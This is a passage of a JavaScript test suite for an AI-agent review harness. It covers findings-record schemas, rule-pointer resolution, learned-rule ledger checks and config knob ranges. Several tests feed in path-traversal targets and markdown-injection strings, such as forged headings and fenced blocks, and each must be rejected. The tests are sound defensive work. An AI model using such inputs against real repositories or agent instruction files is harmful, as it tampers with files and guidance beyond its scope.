// Continual-harness (v1.3) regression suite — wave-0 lane T01.
//
// Covers the findings/ledger contracts, the exact pointer resolver, the window binding
// by value, the git-port hardening (--literal-pathspecs, pathspec-magic refusal,
// symlink discipline), the learned_rules knob ranges, and the test wiring itself.
//
// Every test names the bug it prevents. Cases guarding a specific finding name it:
// `(review B6)`, `(audit F2)` — the same rule the gate enforces on everyone else.

import assert from "node:assert/strict"
import { spawnSync } from "node:child_process"
import fs from "node:fs"
import os from "node:os"
import path from "node:path"
import { describe, it } from "node:test"
import { fileURLToPath } from "node:url"

import {
  assessWindow,
  citationCompetence,
  countableWindow,
  countByAgent,
  countByRule,
  distinctEvidenceSessions,
  exclusionReasonOf,
  meetsProposeBar,
  newestTier,
  readWindow,
  recallEstimate,
  resolveRulePointer,
  TARGETS_ALLOWED,
  unciteableRatio,
  validateLearnedRules,
  validateLedger,
  validateRecord,
  weightedEvidence,
} from "../scripts/harness-findings.mjs"
import { makeGit, resolveInsideRoot, safeReadFile, sourceHash, validatePathEntries } from "../scripts/harness-quality-core.mjs"

const REPO_ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..")
const FINDINGS_SCRIPT = path.join(REPO_ROOT, "scripts", "harness-findings.mjs")

// ---------------------------------------------------------------------------
// helpers

function tempRoot(prefix = "harness-findings-") {
  return fs.mkdtempSync(path.join(os.tmpdir(), prefix))
}

function write(root, relative, content) {
  const target = path.join(root, relative)
  fs.mkdirSync(path.dirname(target), { recursive: true })
  fs.writeFileSync(target, content, "utf8")
  return target
}

function runFindings(args, { root } = {}) {
  return spawnSync(process.execPath, [FINDINGS_SCRIPT, ...(root ? ["--root", root] : []), ...args], { encoding: "utf8" })
}

// A real throwaway git repo (used where the actual git port must be exercised).
function makeRepo(prefix = "harness-findings-repo-") {
  const root = tempRoot(prefix)
  const git = (args) => spawnSync("git", ["-c", "user.name=t", "-c", "user.email=t@t", ...args], { cwd: root, encoding: "utf8" })
  git(["init", "-q"])
  return { root, git }
}

const MODEL = "opencode-go/deepseek-v4-flash"
const STANDARDS_FILE = "agent-os/standards/vue.md"
const STANDARDS_TEXT = `# Vue/Nuxt Standard

## Server State in Store

<!-- anchor: server-state-in-store -->

- Keep server state in the store.
`

const baseRecord = (overrides = {}) => ({
  id: "f-1",
  file: "src/app.vue",
  line: 42,
  class: "rule_violation",
  rule: `${STANDARDS_FILE}#server-state-in-store`,
  severity: "major",
  lane: "T02",
  capability: "vue-engineer",
  model: MODEL,
  changed_lines_in_lane: 214,
  summary: "server state held in a composable ref instead of the store",
  ...overrides,
})

const baseManifest = { lanes: [{ lane: "T02", capability: "vue-engineer", model: MODEL, ownership: ["src/app.vue"], changed_lines: 214 }] }

function rootWithStandards() {
  const root = tempRoot()
  write(root, STANDARDS_FILE, STANDARDS_TEXT)
  return root
}

// A fake git for the window's trailer check: only `text` is exercised.
const fakeGit = (responses = {}) => {
  const table = { "log --format=%B": "Subject line\n\nSource-Hash: deadbeefdeadbeef\nAdherence: 0\n", ...responses }
  return { text: (args) => table[args.join(" ")] ?? table[args[0]] ?? "" }
}

const windowEntry = (overrides = {}) => ({
  file: "docs/harness/findings/f.json",
  ok: true,
  data: { run: { label: "scheduler", tier: "full", gate_report: "docs/harness/quality/r.json", gate_source_hash: "abc123" }, roster: [{ reviewer: "code-reviewer" }], findings: [] },
  ...overrides,
})

function withThresholds(root, learnedRules) {
  write(root, "agent-os/quality-thresholds.json", JSON.stringify({ phase: "A", metrics: {}, learned_rules: learnedRules }, null, 2))
}

// ---------------------------------------------------------------------------

describe("validateRecord — the record schema (A1)", () => {
  const root = rootWithStandards()
  const valid = () => validateRecord(baseRecord(), { root })

  it("accepts a well-formed rule_violation record", () => {
    assert.equal(valid().ok, true)
  })

  it("rejects a record with no class (review B6)", () => {
    const { id, ...withoutClass } = baseRecord()
    void id
    assert.equal(validateRecord(withoutClass, { root }).ok, false)
  })

  it("rejects an unknown class", () => {
    assert.equal(validateRecord(baseRecord({ class: "opinion" }), { root }).ok, false)
  })

  it("rejects a rule_violation with no rule", () => {
    const { rule, ...withoutRule } = baseRecord()
    void rule
    assert.equal(validateRecord(withoutRule, { root }).ok, false)
  })

  it("rejects a rule_violation whose rule does not resolve (audit F2)", () => {
    assert.equal(validateRecord(baseRecord({ rule: `${STANDARDS_FILE}#server-state-in-stores` }), { root }).ok, false)
  })

  it("rejects a record with no capability (A1)", () => {
    const { capability, ...withoutCapability } = baseRecord()
    void capability
    assert.equal(validateRecord(withoutCapability, { root }).ok, false)
  })

  it("rejects a record whose lane is not in the manifest (review B10)", () => {
    const result = validateRecord(baseRecord({ lane: "T99" }), { root, manifest: baseManifest })
    assert.equal(result.ok, false)
    assert.match(result.errors.join(" "), /not in the run's lane manifest/)
  })

  it("rejects a record whose capability disagrees with the lane manifest (review B10)", () => {
    assert.equal(validateRecord(baseRecord({ capability: "python-engineer" }), { root, manifest: baseManifest }).ok, false)
  })

  it("rejects a record whose model disagrees with the lane manifest (review B10)", () => {
    assert.equal(validateRecord(baseRecord({ model: "openai/gpt-5.6-sol" }), { root, manifest: baseManifest }).ok, false)
  })

  it("rejects a record whose changed_lines_in_lane disagrees with the manifest (review B10)", () => {
    assert.equal(validateRecord(baseRecord({ changed_lines_in_lane: 1 }), { root, manifest: baseManifest }).ok, false)
  })

  it("accepts the record when it agrees with the manifest on every field", () => {
    assert.equal(validateRecord(baseRecord(), { root, manifest: baseManifest }).ok, true)
  })
})

describe("resolveRulePointer — exact, never fuzzy (A2, audit F2)", () => {
  const root = rootWithStandards()

  it("resolves a heading whose GitHub-style slug equals the anchor exactly", () => {
    const resolved = resolveRulePointer(`${STANDARDS_FILE}#server-state-in-store`, { root })
    assert.equal(resolved.ok, true)
    assert.equal(resolved.line, 3)
  })

  it("resolves an explicit <!-- anchor: id --> marker line", () => {
    const resolved = resolveRulePointer(`${STANDARDS_FILE}#server-state-in-store`, { root })
    assert.equal(resolved.ok, true)
    // The marker line carries the same anchor; either match is exact, both point at real text.
    assert.equal(typeof resolved.line, "number")
  })

  it("rejects an anchor matching only a SIMILAR heading (A2)", () => {
    // `## Server State in Store` slugs to server-state-in-store, never server-state-in-stores.
    const result = resolveRulePointer(`${STANDARDS_FILE}#server-state-in-stores`, { root })
    assert.equal(result.ok, false)
    assert.match(result.reason, /exactly matching/)
  })

  it("rejects a pointer to AGENTS.md (A3, review F4)", () => {
    const result = resolveRulePointer("AGENTS.md#harness", { root })
    assert.equal(result.ok, false)
    assert.match(result.reason, /AGENTS.md is not a valid rule target/)
  })

  it("rejects a pointer with no anchor", () => {
    assert.equal(resolveRulePointer(`${STANDARDS_FILE}`, { root }).ok, false)
  })

  it("rejects a pointer to a missing file", () => {
    assert.equal(resolveRulePointer("agent-os/standards/does-not-exist.md#x", { root }).ok, false)
  })

  it("rejects a pointer escaping the repository (review B6)", () => {
    assert.equal(resolveRulePointer("../../outside.md#x", { root }).ok, false)
  })
})

describe("validateLedger — text is single-line and fenced-content-free (A3, A4, review B4, D21)", () => {
  const root = tempRoot()
  const config = { rule_text_max_chars: 200 }

  const baseRule = (overrides = {}) => ({
    id: "vue-002",
    text: "Server state lives in a Pinia store, never in a composable ref.",
    target: "agent-os/standards/vue.md",
    anchor: "server-state-in-store",
    enforcement: "prose",
    status: "active",
    created_at_run: "2026-08-12T09-14-02-scheduler",
    provenance: {
      first_seen: "2026-08-11",
      source_findings: ["f-118", "f-131", "f-147"],
      proposed_by: "harness-refine",
      approved_by: "operator",
      approved_at: "2026-08-12",
      refuted_by: "if the ref pattern in useFilters is intentional per decisions.md 2026-07-14",
    },
    stats: { violations_before: 3, violations_after: 0, citations: 0, last_violation: "2026-08-11", last_citation: null, runs_since_approval: 0 },
    ...overrides,
  })

  const ledger = (rules, extra = {}) => ({ version: 2, targets_allowed: ["agent-os/standards/"], rules, conflicts: [], retired: [], ...extra })

  // SEC-R1: the full auditable set a rule-verifier approval must carry — config toggle
  // true in the thresholds file, a non-high-risk target, the refutation report, evidence,
  // complete stats and session-compatible dates.
  const verifierBase = (overrides = {}) =>
    baseRule({
      provenance: {
        ...baseRule().provenance,
        approved_by: "rule-verifier",
        verifier_report: "could not refute: no contradiction with vue.md; duplicate of nothing",
      },
      ...overrides,
    })

  function rootWithVerifierThresholds({ highRisk = [] } = {}) {
    const root = tempRoot()
    write(
      root,
      "agent-os/quality-thresholds.json",
      JSON.stringify(
        { phase: "A", metrics: {}, high_risk_paths: highRisk, learned_rules: { rule_text_max_chars: 200, auto_activate_prose_observe: true } },
        null,
        2,
      ),
    )
    return root
  }

  it("accepts a well-formed prose rule", () => {
    assert.equal(validateLedger(ledger([baseRule()]), { root, config }).ok, true)
  })

  it("rejects text containing a newline (review B4)", () => {
    const result = validateLedger(ledger([baseRule({ text: "line one\nline two" })]), { root, config })
    assert.equal(result.ok, false)
    assert.match(result.errors.join(" "), /single-line/)
  })

  it("rejects text containing a fenced block (review B4)", () => {
    const result = validateLedger(ledger([baseRule({ text: "never do ```code```" })]), { root, config })
    assert.equal(result.ok, false)
    assert.match(result.errors.join(" "), /fenced/)
  })

  it("rejects text containing a markdown heading (review B4)", () => {
    const result = validateLedger(ledger([baseRule({ text: "## New Heading" })]), { root, config })
    assert.equal(result.ok, false)
    assert.match(result.errors.join(" "), /headings/)
  })

  it("rejects text containing a control character (review B4)", () => {
    assert.equal(validateLedger(ledger([baseRule({ text: "tab\there" })]), { root, config }).ok, false)
  })

  it("rejects text over rule_text_max_chars (A4)", () => {
    const long = "x".repeat(201)
    assert.equal(validateLedger(ledger([baseRule({ text: long })]), { root, config }).ok, false)
  })

  it("rejects a target of AGENTS.md (A3, review F4)", () => {
    const result = validateLedger(ledger([baseRule({ target: "AGENTS.md" })]), { root, config })
    assert.equal(result.ok, false)
    assert.match(result.errors.join(" "), /AGENTS.md is not allowed/)
  })

  it("rejects a target outside targets_allowed", () => {
    assert.equal(validateLedger(ledger([baseRule({ target: "src/stores/parts.ts" })]), { root, config }).ok, false)
  })

  it("requires an anchor — a rule that cannot be cited cannot be measured", () => {
    const { anchor, ...withoutAnchor } = baseRule()
    void anchor
    assert.equal(validateLedger(ledger([withoutAnchor]), { root, config }).ok, false)
  })

  it("rejects a code example inline in text and accepts it in its own quoted field (D9)", () => {
    // Inline: the newline/fence checks catch the multi-line case.
    assert.equal(validateLedger(ledger([baseRule({ text: "never do:\n```\nsecret = 1\n```" })]), { root, config }).ok, false)
    const withExample = baseRule({ example: { right: "src/stores/parts.ts:12", wrong: "src/composables/useFilters.ts:31" } })
    assert.equal(validateLedger(ledger([withExample]), { root, config }).ok, true)
    assert.equal(validateLedger(ledger([baseRule({ example: "inline" })]), { root, config }).ok, false)
  })

  it("rejects a prose rule approved by rule-verifier with no verifier_report (D21)", () => {
    const rule = verifierBase({ provenance: { ...verifierBase().provenance, verifier_report: undefined } })
    const result = validateLedger(ledger([rule]), { root, config })
    assert.equal(result.ok, false)
    assert.match(result.errors.join(" "), /verifier_report required/)
  })

  it("rejects rule-verifier approval when auto_activate_prose_observe is false (SEC-R1)", () => {
    const root2 = rootWithVerifierThresholds()
    write(
      root2,
      "agent-os/quality-thresholds.json",
      JSON.stringify({ phase: "A", metrics: {}, learned_rules: { auto_activate_prose_observe: false } }, null, 2),
    )
    const result = validateLedger(ledger([verifierBase()]), { root: root2, config: { auto_activate_prose_observe: false } })
    assert.equal(result.ok, false)
    assert.match(result.errors.join(" "), /auto_activate_prose_observe: true/)
  })

  it("rejects rule-verifier approval when the toggle is absent — fail closed, never a default (SEC-R1)", () => {
    const result = validateLedger(ledger([verifierBase()]), { root, config })
    assert.equal(result.ok, false)
    assert.match(result.errors.join(" "), /auto_activate_prose_observe: true/)
  })

  it("accepts rule-verifier approval when only STORAGE-path high risk matches — D21 reachability (FINAL-R1)", () => {
    // Every permitted target lives under agent-os/standards/, which matches the `**/standards/**`
    // storage glob in high_risk_paths. Rejecting on it made verifier approval structurally
    // impossible; the storage glob stays high-risk for the NEXT run's tier-full retroactive veto,
    // not as a pre-commit block (D21, FINAL-R1).
    const root2 = rootWithVerifierThresholds({ highRisk: ["**/standards/**", "**/learned-rules.json"] })
    const result = validateLedger(ledger([verifierBase()]), { root: root2, config: { auto_activate_prose_observe: true } })
    assert.equal(result.ok, true)
  })

  it("rejects rule-verifier approval on an EFFECT-level high-risk target (FINAL-R1)", () => {
    // A target matching a high-risk glob OUTSIDE the storage scope keeps the pre-commit operator
    // gate — `**/*crypto*` matches agent-os/standards/crypto.md.
    const root2 = rootWithVerifierThresholds({ highRisk: ["**/*crypto*"] })
    const rule = verifierBase({ target: "agent-os/standards/crypto.md" })
    const result = validateLedger(ledger([rule]), { root: root2, config: { auto_activate_prose_observe: true } })
    assert.equal(result.ok, false)
    assert.match(result.errors.join(" "), /effect-level high-risk/)
  })

  it("accepts a prose rule approved by rule-verifier ONLY with the full auditable set (D21, SEC-R1)", () => {
    const root2 = rootWithVerifierThresholds({ highRisk: [] })
    const result = validateLedger(ledger([verifierBase()]), { root: root2, config: { rule_text_max_chars: 200, auto_activate_prose_observe: true } })
    assert.equal(result.ok, true)
  })

  it("rejects rule-verifier approval with no evidence — source_findings must be non-empty (SEC-R1)", () => {
    const root2 = rootWithVerifierThresholds({ highRisk: [] })
    const rule = verifierBase({ provenance: { ...verifierBase().provenance, source_findings: [] } })
    const result = validateLedger(ledger([rule]), { root: root2, config: { auto_activate_prose_observe: true } })
    assert.equal(result.ok, false)
    assert.match(result.errors.join(" "), /non-empty array/)
  })

  it("rejects rule-verifier approval with partial stats — not auditable (SEC-R1)", () => {
    const root2 = rootWithVerifierThresholds({ highRisk: [] })
    const { runs_since_approval, ...partialStats } = verifierBase().stats
    void runs_since_approval
    const rule = verifierBase({ stats: partialStats })
    const result = validateLedger(ledger([rule]), { root: root2, config: { auto_activate_prose_observe: true } })
    assert.equal(result.ok, false)
    assert.match(result.errors.join(" "), /not auditable/)
  })

  it("rejects rule-verifier approval whose approved_at predates first_seen (session compatibility, SEC-R1)", () => {
    const root2 = rootWithVerifierThresholds({ highRisk: [] })
    const rule = verifierBase({ provenance: { ...verifierBase().provenance, first_seen: "2026-08-13", approved_at: "2026-08-12" } })
    const result = validateLedger(ledger([rule]), { root: root2, config: { auto_activate_prose_observe: true } })
    assert.equal(result.ok, false)
    assert.match(result.errors.join(" "), /must not predate first_seen/)
  })

  it("rejects rule-verifier approval without a session-compatible created_at_run (SEC-R1)", () => {
    const root2 = rootWithVerifierThresholds({ highRisk: [] })
    const { created_at_run, ...withoutRun } = verifierBase()
    void created_at_run
    const result = validateLedger(ledger([withoutRun]), { root: root2, config: { auto_activate_prose_observe: true } })
    assert.equal(result.ok, false)
    assert.match(result.errors.join(" "), /created_at_run required/)
  })

  it("rejects a rule-verifier approval on a rule that can block (D21)", () => {
    const rule = baseRule({ enforcement: "lint", provenance: { ...baseRule().provenance, approved_by: "rule-verifier", verifier_report: "report" } })
    const result = validateLedger(ledger([rule]), { root, config })
    assert.equal(result.ok, false)
    assert.match(result.errors.join(" "), /requires enforcement "prose"/)
  })

  it("accepts an operator-approved rule with no verifier_report (D21)", () => {
    assert.equal(validateLedger(ledger([baseRule({ approved_by: "operator" })]), { root, config }).ok, true)
  })

  it("accepts a ledger carrying the allowlist constant verbatim and rejects any mutation (SEC-R1, FINAL-R1)", () => {
    const okLedger = ledger([])
    assert.equal(validateLedger(okLedger, { root, config }).ok, true)
    const reordered = ledger([], { targets_allowed: ["agent-os/standards/"] })
    assert.equal(validateLedger(reordered, { root, config }).ok, true)
    const widened = ledger([], { targets_allowed: ["src/", "agent-os/standards/"] })
    const result = validateLedger(widened, { root, config })
    assert.equal(result.ok, false)
    assert.match(result.errors.join(" "), /may not be changed, emptied, extended or reordered/)
    // FINAL-R1: an entry appended AFTER the constant used to pass, because the comparison only
    // walked the constant's length — exact length is now required.
    const extended = ledger([], { targets_allowed: ["agent-os/standards/", "src/"] })
    const extendedResult = validateLedger(extended, { root, config })
    assert.equal(extendedResult.ok, false)
    assert.match(extendedResult.errors.join(" "), /may not be changed, emptied, extended or reordered/)
    const emptied = ledger([], { targets_allowed: [] })
    assert.equal(validateLedger(emptied, { root, config }).ok, false)
    // FINAL-R1: the field is required — a ledger that omits it is a mutation attempt, not a
    // partial declaration.
    const { targets_allowed, ...withoutAllowlist } = ledger([])
    void targets_allowed
    const missingResult = validateLedger(withoutAllowlist, { root, config })
    assert.equal(missingResult.ok, false)
    assert.match(missingResult.errors.join(" "), /targets_allowed required/)
    assert.deepEqual(TARGETS_ALLOWED, ["agent-os/standards/"])
  })

  it("rejects a target with a dot-dot segment — traversal escapes the allowlist prefix (SEC-R1)", () => {
    const result = validateLedger(ledger([baseRule({ target: "agent-os/standards/../../src/parts.ts" })]), { root, config })
    assert.equal(result.ok, false)
    assert.match(result.errors.join(" "), /dot-dot segment/)
  })

  it("rejects an absolute target — repository-relative only (SEC-R1)", () => {
    const posix = validateLedger(ledger([baseRule({ target: "/agent-os/standards/vue.md" })]), { root, config })
    assert.equal(posix.ok, false)
    assert.match(posix.errors.join(" "), /repository-relative/)
    const windows = validateLedger(ledger([baseRule({ target: "C:/agent-os/standards/vue.md" })]), { root, config })
    assert.equal(windows.ok, false)
    assert.match(windows.errors.join(" "), /repository-relative/)
  })

  it("rejects a non-markdown target (SEC-R1)", () => {
    const result = validateLedger(ledger([baseRule({ target: "agent-os/standards/vue.txt" })]), { root, config })
    assert.equal(result.ok, false)
    assert.match(result.errors.join(" "), /markdown file \(\.md\)/)
  })

  it("applies the text injection constraints to example.right and example.wrong (SEC-R1)", () => {
    const withExample = (right, wrong) => baseRule({ example: { right, wrong } })
    const newline = validateLedger(ledger([withExample("src/a.ts:1\n# forged", "src/b.ts:2")]), { root, config })
    assert.equal(newline.ok, false)
    assert.match(newline.errors.join(" "), /example\.right must be single-line/)
    const fence = validateLedger(ledger([withExample("src/a.ts:1", "never do ```code```")]), { root, config })
    assert.equal(fence.ok, false)
    assert.match(fence.errors.join(" "), /example\.wrong must not contain fenced blocks/)
    const heading = validateLedger(ledger([withExample("## New Heading", "src/b.ts:2")]), { root, config })
    assert.equal(heading.ok, false)
    assert.match(heading.errors.join(" "), /example\.right must not contain markdown headings/)
    const control = validateLedger(ledger([withExample("src/a.ts:1", "tab\there")]), { root, config })
    assert.equal(control.ok, false)
    assert.match(control.errors.join(" "), /example\.wrong must not contain control characters/)
    const long = validateLedger(ledger([withExample("x".repeat(201), "src/b.ts:2")]), { root, config })
    assert.equal(long.ok, false)
    assert.match(long.errors.join(" "), /example\.right exceeds rule_text_max_chars/)
    const clean = validateLedger(ledger([withExample("src/a.ts:1", "src/b.ts:2")]), { root, config })
    assert.equal(clean.ok, true)
  })
})

describe("learned_rules knobs — out of range is exit 2, never a default (A12, T02 S2, review B12)", () => {
  const goodKnobs = {
    stage: 1,
    min_findings_to_propose: 3,
    min_sessions_to_propose: 2,
    operator_note_weight: 3,
    reviewer_finding_weight: 1,
    defect_weight: 3,
    max_active_rules_per_target: 12,
    max_proposals_per_run_per_component: 1,
    retire_after_days_without_citation: 60,
    rewrite_after_violations_after: 3,
    recall_sample_every_n_runs: 10,
    stage1_window_runs: 30,
    citation_competence_min_samples: 3,
    citation_competence_floor: null,
    reviewer_recall_floor: null,
    rule_text_max_chars: 200,
    standards_file_lines_max: 200,
    enforced_fraction_min_runs: 3,
    auto_activate_prose_observe: true,
  }

  const validRecordJson = () => JSON.stringify(baseRecord({ class: "nit", summary: "preference, no rule behind it" }))

  it("accepts the shipped knob set", () => {
    assert.equal(validateLearnedRules(goodKnobs).ok, true)
  })

  it("rejects operator_note_weight: 0 with exit 2 via the CLI (T02 S2)", () => {
    const root = tempRoot()
    withThresholds(root, { ...goodKnobs, operator_note_weight: 0 })
    write(root, "record.json", validRecordJson())
    const result = runFindings(["--validate", "record.json"], { root })
    assert.equal(result.status, 2)
    assert.match(result.stderr, /operator_note_weight/)
  })

  it("rejects max_active_rules_per_target: 99999 with exit 2 (T02 S2)", () => {
    const root = tempRoot()
    withThresholds(root, { ...goodKnobs, max_active_rules_per_target: 99999 })
    write(root, "record.json", validRecordJson())
    const result = runFindings(["--validate", "record.json"], { root })
    assert.equal(result.status, 2)
    assert.match(result.stderr, /max_active_rules_per_target/)
  })

  it("rejects recall_sample_every_n_runs above the S6 cap with exit 2", () => {
    // cap = floor(30 / 3) = 10; 11 would defer sampling past a stage-1 window (S6).
    const root = tempRoot()
    withThresholds(root, { ...goodKnobs, recall_sample_every_n_runs: 11 })
    write(root, "record.json", validRecordJson())
    const result = runFindings(["--validate", "record.json"], { root })
    assert.equal(result.status, 2)
    assert.match(result.stderr, /S6|stage-1 window/)
  })

  it("rejects an unknown knob — a control with no code owner (T02 S2)", () => {
    const root = tempRoot()
    withThresholds(root, { ...goodKnobs, shiny_new_knob: 1 })
    write(root, "record.json", validRecordJson())
    const result = runFindings(["--validate", "record.json"], { root })
    assert.equal(result.status, 2)
    assert.match(result.stderr, /no range row/)
  })

  it("rejects an empty learned_rules block — a declared feature with no knobs is partial, not absent (SEC-R1)", () => {
    const root = tempRoot()
    withThresholds(root, {})
    write(root, "record.json", validRecordJson())
    const result = runFindings(["--validate", "record.json"], { root })
    assert.equal(result.status, 2)
    assert.match(result.stderr, /empty block/)
  })

  it("the exported validator handles missing, partial and invalid blocks deterministically (SEC-R1)", () => {
    assert.equal(validateLearnedRules({}).ok, false) // present but empty → partial
    assert.equal(validateLearnedRules(null).ok, false) // null → invalid, never a default
    assert.equal(validateLearnedRules([1, 2]).ok, false) // array → invalid
    assert.equal(validateLearnedRules({ stage: 1 }).ok, true) // present knobs range-checked
    assert.equal(validateLearnedRules(goodKnobs).ok, true) // complete → valid
  })

  it("does not fire when the thresholds file has no learned_rules block", () => {
    const root = tempRoot()
    write(root, "agent-os/quality-thresholds.json", JSON.stringify({ phase: "A", metrics: {} }))
    write(root, "record.json", validRecordJson())
    const result = runFindings(["--validate", "record.json"], { root })
    assert.equal(result.status, 0)
  })
})

describe("readWindow / assessWindow — bound by value, roster-gated (A5, A6, review B8)", () => {
  const report = { sourceHash: "abc123" }

  it("rejects the window when the newest file's recorded hash does not match the report (review B8)", () => {
    const window = [windowEntry({ data: { run: { gate_source_hash: "different" }, roster: [{}], findings: [] } })]
    const result = assessWindow(window, { report, tier: "full" })
    assert.equal(result.ok, false)
    assert.match(result.errors.join(" "), /does not match the evaluated report/)
  })

  it("accepts the window when the newest file's hash matches exactly", () => {
    const window = [windowEntry()]
    assert.equal(assessWindow(window, { report, tier: "full" }).ok, true)
  })

  it("rejects tier full with no findings file at all (review B8)", () => {
    const result = assessWindow([], { report, tier: "full" })
    assert.equal(result.ok, false)
    assert.match(result.errors.join(" "), /tier full with no findings file/)
  })

  it("rejects tier auto with a findings file present (review B8)", () => {
    const result = assessWindow([windowEntry()], { report, tier: "auto" })
    assert.equal(result.ok, false)
    assert.match(result.errors.join(" "), /tier auto with 1 findings file/)
  })

  it("accepts tier auto with no findings file", () => {
    assert.equal(assessWindow([], { report, tier: "auto" }).ok, true)
  })

  it("rejects any file with no reviewer roster (review B8)", () => {
    const noRoster = windowEntry({ unavailable: "no reviewer roster" })
    const result = assessWindow([noRoster], { report, tier: "full" })
    assert.equal(result.ok, false)
    assert.match(result.errors.join(" "), /no reviewer roster/)
  })

  it("rejects a malformed file instead of dropping it (R3)", () => {
    const malformed = windowEntry({ ok: false, error: "malformed JSON — reported, never dropped" })
    const result = assessWindow([malformed], { report, tier: "full" })
    assert.equal(result.ok, false)
    assert.match(result.errors.join(" "), /malformed/)
  })

  it("treats findings: [] with a roster as an honest zero (A6)", () => {
    const window = [windowEntry({ data: { run: { gate_source_hash: "abc123" }, roster: [{ reviewer: "code-reviewer" }], findings: [] } })]
    assert.equal(assessWindow(window, { report, tier: "full" }).ok, true)
  })

  it("requires an older file's hash to appear in a commit trailer (review B8)", () => {
    const git = fakeGit({ "log --format=%B": "Subject\n\nSource-Hash: deadbeefdeadbeef\n" })
    const older = windowEntry({
      file: "docs/harness/findings/older.json",
      data: { run: { gate_source_hash: "deadbeefdeadbeef" }, roster: [{}], findings: [] },
    })
    const window = [windowEntry(), older]
    assert.equal(assessWindow(window, { report, tier: "full", git }).ok, true)
  })

  it("rejects an older file whose hash is in no trailer (review B8)", () => {
    const git = fakeGit({ "log --format=%B": "Subject\n\nSource-Hash: deadbeefdeadbeef\n" })
    const older = windowEntry({
      file: "docs/harness/findings/older.json",
      data: { run: { gate_source_hash: "cafebabecafebabe" }, roster: [{}], findings: [] },
    })
    const result = assessWindow([windowEntry(), older], { report, tier: "full", git })
    assert.equal(result.ok, false)
    assert.match(result.errors.join(" "), /not found in any commit trailer/)
  })

  it("readWindow marks a no-roster file unavailable and reports malformed files (A6)", () => {
    const root = tempRoot()
    write(root, "docs/harness/findings/a.json", JSON.stringify({ run: {}, findings: [] }))
    write(root, "docs/harness/findings/b.json", "{ not json")
    const window = readWindow({ root, runs: 2 })
    assert.equal(window.length, 2)
    const byName = Object.fromEntries(window.map((entry) => [entry.file.split(/[\\/]/).pop(), entry]))
    assert.equal(byName["a.json"].unavailable.includes("no reviewer roster"), true)
    assert.equal(byName["b.json"].ok, false)
    assert.match(byName["b.json"].error, /malformed/)
  })
})

describe("weightedEvidence / meetsProposeBar — weighted bar AND distinct-session bar (A7, D7, SEC-R1)", () => {
  const rule = `${STANDARDS_FILE}#server-state-in-store`
  const config = { operator_note_weight: 3, reviewer_finding_weight: 1, defect_weight: 3, min_findings_to_propose: 3, min_sessions_to_propose: 2 }

  const entryWith = (records, run = {}) =>
    // FINAL-R2: the envelope must record a tier — the count functions refuse a window
    // whose anchor records none (the same refusal the adherence adapter emits), so the
    // helper builds the schema-valid envelope (tier is a required run field).
    windowEntry({ data: { run: { tier: "full", gate_source_hash: "abc123", ...run }, roster: [{}], findings: records } })

  it("one operator note reaches the weighted bar", () => {
    const window = [entryWith([baseRecord({ id: "f-op", class: "operator_note", rule, summary: "fixed by hand" })])]
    const weighted = weightedEvidence(window, rule, config)
    assert.equal(weighted, 3)
    assert.equal(meetsProposeBar(weighted, config, 2), true)
  })

  it("one reviewer finding does not reach the weighted bar", () => {
    const window = [entryWith([baseRecord({ id: "f-2" })])]
    const weighted = weightedEvidence(window, rule, config)
    assert.equal(weighted, 1)
    assert.equal(meetsProposeBar(weighted, config, 2), false)
  })

  it("counts only records citing the rule in question", () => {
    const window = [entryWith([baseRecord({ id: "f-3" }), baseRecord({ id: "f-4", rule: "agent-os/standards/python.md#x" })])]
    assert.equal(weightedEvidence(window, rule, config), 1)
  })

  it("one bad session cannot legislate — weighted bar met, session bar not (D7, SEC-R1)", () => {
    // Three operator notes all in ONE session: weight 9 clears min_findings_to_propose
    // but the evidence never leaves a single session.
    const window = [
      entryWith(
        [
          baseRecord({ id: "f-op1", class: "operator_note", rule, summary: "a" }),
          baseRecord({ id: "f-op2", class: "operator_note", rule, summary: "b" }),
          baseRecord({ id: "f-op3", class: "operator_note", rule, summary: "c" }),
        ],
        { session: "2026-08-12T09-00-00-scheduler" },
      ),
    ]
    const weighted = weightedEvidence(window, rule, config)
    assert.equal(weighted, 9)
    assert.equal(distinctEvidenceSessions(window, rule), 1)
    assert.equal(meetsProposeBar(weighted, config, distinctEvidenceSessions(window, rule)), false)
  })

  it("evidence across the configured number of sessions reaches the bar (D7, SEC-R1)", () => {
    const window = [
      entryWith([baseRecord({ id: "f-1" })], { session: "2026-08-12T09-00-00-scheduler" }),
      entryWith([baseRecord({ id: "f-2" })], { session: "2026-08-13T09-00-00-scheduler" }),
      entryWith([baseRecord({ id: "f-3" })], { session: "2026-08-14T09-00-00-scheduler" }),
    ]
    const weighted = weightedEvidence(window, rule, config)
    assert.equal(weighted, 3)
    assert.equal(distinctEvidenceSessions(window, rule), 3)
    assert.equal(meetsProposeBar(weighted, config, distinctEvidenceSessions(window, rule)), true)
  })

  it("falls back to run.label when run.session is absent, and treats a file with neither as its own session (SEC-R1)", () => {
    const window = [
      entryWith([baseRecord({ id: "f-1" })], { label: "local" }),
      entryWith([baseRecord({ id: "f-2" })], { label: "local" }),
      entryWith([baseRecord({ id: "f-3" })], {}),
    ]
    assert.equal(distinctEvidenceSessions(window, rule), 2)
  })

  it("omitting the session count fails closed — a caller that forgot the D7 bar cannot pass (SEC-R1)", () => {
    const window = [entryWith([baseRecord({ id: "f-1" })])]
    assert.equal(meetsProposeBar(weightedEvidence(window, rule, config), config), false)
  })
})

describe("countByRule / countByAgent — grouped by capability, model carried never grouped (A8, review M13)", () => {
  const entryWith = (records) => windowEntry({ data: { run: { tier: "full", gate_source_hash: "abc123" }, roster: [{}], findings: records } })

  it("countByRule groups by the rule pointer", () => {
    const window = [entryWith([baseRecord({ id: "f-1" }), baseRecord({ id: "f-2", rule: "agent-os/standards/python.md#x" }), baseRecord({ id: "f-3" })])]
    const rows = countByRule(window)
    const byRule = Object.fromEntries(rows.map((row) => [row.rule, row.count]))
    assert.equal(byRule[`${STANDARDS_FILE}#server-state-in-store`], 2)
    assert.equal(byRule["agent-os/standards/python.md#x"], 1)
  })

  it("countByAgent groups by capability and carries the model without grouping on it (review M13)", () => {
    const window = [
      entryWith([
        baseRecord({ id: "f-1", capability: "vue-engineer", model: MODEL }),
        baseRecord({ id: "f-2", capability: "vue-engineer", model: "openai/gpt-5.6-sol" }),
        baseRecord({ id: "f-3", capability: "python-engineer", model: MODEL }),
      ]),
    ]
    const rows = countByAgent(window)
    assert.equal(rows.length, 2)
    const vue = rows.find((row) => row.capability === "vue-engineer")
    assert.equal(vue.count, 2)
    assert.deepEqual(vue.models.sort(), [MODEL, "openai/gpt-5.6-sol"].sort())
  })

  it("skips unavailable and malformed window entries without pretending they are zero (A6)", () => {
    const window = [
